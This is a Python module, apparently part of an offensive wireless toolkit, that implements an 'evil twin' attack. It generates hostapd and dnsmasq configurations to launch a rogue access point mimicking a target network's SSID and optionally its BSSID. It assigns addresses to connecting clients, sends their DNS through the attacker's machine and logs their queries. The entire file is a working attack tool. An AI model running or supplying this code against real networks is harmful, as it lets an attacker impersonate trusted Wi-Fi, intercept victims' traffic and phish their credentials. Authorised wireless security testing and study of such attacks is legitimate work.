"""
Evil Twin Attack: create a rogue AP with the same SSID as target.
Uses hostapd + dnsmasq for a lightweight captive portal setup.
"""
import os
import subprocess
import tempfile
import time


class EvilTwin:
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger
        self._proc_hostapd = None
        self._proc_dnsmasq = None

    def _write_hostapd_conf(self, iface, ssid, channel, bssid=None):
        conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        if bssid:
            conf += f"bssid={bssid}\n"
        fd, path = tempfile.mkstemp(prefix="hostapd_daemon_", suffix=".conf")
        os.write(fd, conf.encode())
        os.close(fd)
        return path

    def _write_dnsmasq_conf(self, iface):
        conf = f"""interface={iface}
dhcp-range=10.9.8.10,10.9.8.250,12h
dhcp-option=3,10.9.8.1
dhcp-option=6,10.9.8.1
server=8.8.8.8
log-queries
log-dhcp
"""
        fd, path = tempfile.mkstemp(prefix="dnsmasq_daemon_", suffix=".conf")
        os.write(fd, conf.encode())
        os.close(fd)
        return path

    def run(self, args):
        ssid = args.ssid or "DEMON_FREE_WIFI"
        iface = args.iface or self.config.iface
        channel = args.channel or 6
        bssid = args.bssid

        self.logger.attack_log(f"Evil Twin -> SSID={ssid} CH={channel} on {iface}")
        try:
            subprocess.run(["ip", "addr", "add", "10.9.8.1/24", "dev", iface], capture_output=True, check=False)
            subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True, check=False)

            hostapd_conf = self._write_hostapd_conf(iface, ssid, channel, bssid)
            dnsmasq_conf = self._write_dnsmasq_conf(iface)

            self.logger.info("Starting hostapd...")
            self._proc_hostapd = subprocess.Popen(["hostapd", hostapd_conf], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(2)
            self.logger.info("Starting dnsmasq...")
            self._proc_dnsmasq = subprocess.Popen(["dnsmasq", "-C", dnsmasq_conf], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(1)

            self.logger.success("Evil Twin AP is live. Press Ctrl+C to stop.")
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.logger.warning("Stopping Evil Twin...")
        except Exception as e:
            self.logger.error(f"Evil Twin error: {e}")
        finally:
            if self._proc_hostapd:
                self._proc_hostapd.terminate()
            if self._proc_dnsmasq:
                self._proc_dnsmasq.terminate()
            self.logger.success("Evil Twin stopped.")
            return True
